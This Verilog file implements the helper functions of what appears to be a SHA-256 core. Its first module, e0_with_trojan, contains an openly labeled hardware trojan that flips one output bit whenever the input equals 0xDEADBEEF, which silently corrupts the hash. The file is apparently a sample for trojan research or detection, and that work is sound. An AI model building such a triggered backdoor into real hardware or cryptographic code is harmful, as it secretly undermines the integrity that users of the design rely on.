`timescale 1ns/1ps

module e0_with_trojan (
    input [31:0] x,
    output [31:0] y
);

    /******** Reg declarations ********/
    wire [31:0] original_y;
    reg [31:0] manipulated_y;
    
    /******** Trojan specific declarations ********/
    // Specific pattern that triggers the Trojan
    wire trojan_trigger_condition = (x == 32'hDEADBEEF);

    /******** Original logic ********/
    assign original_y = {x[1:0], x[31:2]} ^ {x[12:0], x[31:13]} ^ {x[21:0], x[31:22]};

    /******** Trojan manipulation process ********/
    always @(*) begin
        if (trojan_trigger_condition) begin
            // Manipulate the output to create a predictable or flawed result
            manipulated_y = {original_y[31:1], ~original_y[0]}; // Flip the least significant bit
        end else begin
            manipulated_y = original_y; // Normal operation
        end
    end

    assign y = manipulated_y;

endmodule

module e1 (x, y);

    input [31:0] x;
    output [31:0] y;

    assign y = {x[5:0],x[31:6]} ^ {x[10:0],x[31:11]} ^ {x[24:0],x[31:25]};

endmodule


module ch (x, y, z, o);

    input [31:0] x, y, z;
    output [31:0] o;

    assign o = z ^ (x & (y ^ z));

endmodule


module maj (x, y, z, o);

    input [31:0] x, y, z;
    output [31:0] o;

    assign o = (x & y) | (z & (x | y));

endmodule


module s0 (x, y);

    input [31:0] x;
    output [31:0] y;

    assign y[31:29] = x[6:4] ^ x[17:15];
    assign y[28:0] = {x[3:0], x[31:7]} ^ {x[14:0],x[31:18]} ^ x[31:3];

endmodule


module s1 (x, y);

    input [31:0] x;
    output [31:0] y;

    assign y[31:22] = x[16:7] ^ x[18:9];
    assign y[21:0] = {x[6:0],x[31:17]} ^ {x[8:0],x[31:19]} ^ x[31:10];

endmodule